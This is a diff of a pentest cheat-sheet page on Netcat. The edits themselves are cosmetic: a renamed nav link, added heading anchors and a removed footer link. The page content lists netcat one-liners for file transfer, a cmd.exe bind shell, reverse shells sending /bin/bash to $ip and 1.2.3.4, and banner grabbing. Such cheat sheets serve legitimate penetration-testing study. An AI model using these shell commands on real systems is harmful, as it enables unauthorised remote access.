@@ -1175,8 +1175,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../" title="Home" class="md-nav__link">
-      Home
+    <a href="../../../" title="About" class="md-nav__link">
+      About
     </a>
   </li>
 
@@ -2614,22 +2614,22 @@
                 
                   <h1>Netcat</h1>
                 
-                <h2 id="establish-the-variable">Establish the variable</h2>
+                <h2 id="establish-the-variable">Establish the variable<a class="headerlink" href="#establish-the-variable" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span><code><span class="nb">export</span> <span class="nv">ip</span><span class="o">=</span><span class="m">192</span>.168.1.100
 </code></pre></div>
 
 
-<h3 id="send-files-with-nc">Send files with <code>nc</code></h3>
+<h3 id="send-files-with-nc">Send files with <code>nc</code><a class="headerlink" href="#send-files-with-nc" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code>nc -nv <span class="nv">$ip</span> <span class="m">4444</span> &lt; /usr/share/windows-binaries/wget.exe
 </code></pre></div>
 
 
-<h3 id="recieve-file-with-nc">Recieve file with <code>nc</code></h3>
+<h3 id="recieve-file-with-nc">Recieve file with <code>nc</code><a class="headerlink" href="#recieve-file-with-nc" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code>nc -nlvp <span class="m">4444</span> &gt; incoming.exe
 </code></pre></div>
 
 
-<h3 id="create-a-reverse-shell-with-ncat-using-cmdexe-on-windows">Create a reverse shell with Ncat using cmd.exe on Windows</h3>
+<h3 id="create-a-reverse-shell-with-ncat-using-cmdexe-on-windows">Create a reverse shell with Ncat using cmd.exe on Windows<a class="headerlink" href="#create-a-reverse-shell-with-ncat-using-cmdexe-on-windows" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code>nc.exe -nlvp 4444 -e cmd.exe
 </code></pre></div>
 
@@ -2639,17 +2639,17 @@
 </code></pre></div>
 
 
-<h3 id="create-a-reverse-shell-with-ncat-using-bash-on-linux">Create a reverse shell with Ncat using bash on Linux</h3>
+<h3 id="create-a-reverse-shell-with-ncat-using-bash-on-linux">Create a reverse shell with Ncat using bash on Linux<a class="headerlink" href="#create-a-reverse-shell-with-ncat-using-bash-on-linux" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code>nc -nv <span class="nv">$ip</span> <span class="m">4444</span> -e /bin/bash
 </code></pre></div>
 
 
-<h3 id="create-a-reverse-shell-with-ncat-using-shell-on-openbsd-unix">Create a reverse shell with Ncat using shell on OpenBSD (Unix)</h3>
+<h3 id="create-a-reverse-shell-with-ncat-using-shell-on-openbsd-unix">Create a reverse shell with Ncat using shell on OpenBSD (Unix)<a class="headerlink" href="#create-a-reverse-shell-with-ncat-using-shell-on-openbsd-unix" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code>/bin/nc.traditional -e /bin/bash <span class="m">1</span>.2.3.4 <span class="m">4444</span>
 </code></pre></div>
 
 
-<h3 id="netcat-for-banner-grabbing">Netcat for Banner Grabbing:</h3>
+<h3 id="netcat-for-banner-grabbing">Netcat for Banner Grabbing:<a class="headerlink" href="#netcat-for-banner-grabbing" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;&quot;</span> <span class="p">|</span> nc -nv -w1 <span class="nv">$ip</span> <span class="m">4444</span>
 </code></pre></div>
                 
@@ -2706,8 +2706,6 @@
       <a href="https://twitter.com/DirWalk" target="_blank" rel="noopener" title="twitter" class="md-footer-social__link fa fa-twitter"></a>
     
       <a href="mailto:dirwalk@pm.me" target="_blank" rel="noopener" title="envelope-o" class="md-footer-social__link fa fa-envelope-o"></a>
-    
-      <a href="https://wiki.dirwalk.com" target="_blank" rel="noopener" title="book" class="md-footer-social__link fa fa-book"></a>
     
   </div>
 </div>
